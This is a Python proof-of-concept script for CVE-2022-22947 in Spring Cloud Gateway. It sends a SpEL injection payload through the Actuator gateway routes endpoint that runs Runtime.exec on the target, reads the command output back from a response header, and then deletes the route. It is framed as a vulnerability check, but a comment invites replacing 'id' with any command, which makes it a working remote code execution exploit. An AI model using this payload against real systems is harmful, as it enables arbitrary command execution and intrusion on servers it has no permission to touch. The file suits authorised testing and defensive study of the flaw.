"""
@Author: exiashow
@File: spring_actuator_api_spel.py
@Date: 2024/3/5 17:20
@Desc: CVE-2022-22947,Spring Cloud Gateway provides a library for building an API Gateway on top of Spring WebFlux.
@Summary: Applications using Spring Cloud Gateway in the version prior to 3.1.0 and 3.0.6,
          are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured.
          A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.
"""

import requests
import sys
import json

headers1 = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

## command to execute replace "id" in payload

payload = '''{\r
  "id": "hacktest",\r
  "filters": [{\r
    "name": "AddResponseHeader",\r
    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
    }],\r
  "uri": "http://example.com",\r
  "order": 0\r
}'''

path1 = ":8080/actuator/gateway/routes/hacktest"
path2 = ":8080/actuator/gateway/refresh"


class SpringActuatorApiSpel(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        try:
            req1 = requests.post(url=self.url + path1, data=payload, headers=headers1, json=json)
            req2 = requests.post(url=self.url + path2, headers=headers2)
            req3 = requests.get(url=self.url + path1, headers=headers2)
            req4 = requests.delete(url=self.url + path1, headers=headers2)
            req5 = requests.post(url=self.url + path2, headers=headers2)

            if req3.status_code == 200 and "uid" in req3.text:
                return "[Warning] Java Spring vulnerability discovered: CVE-2022-22947"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == '__main__':
    fallingSword = SpringActuatorApiSpel(sys.argv[1])
    fallingSword.run()
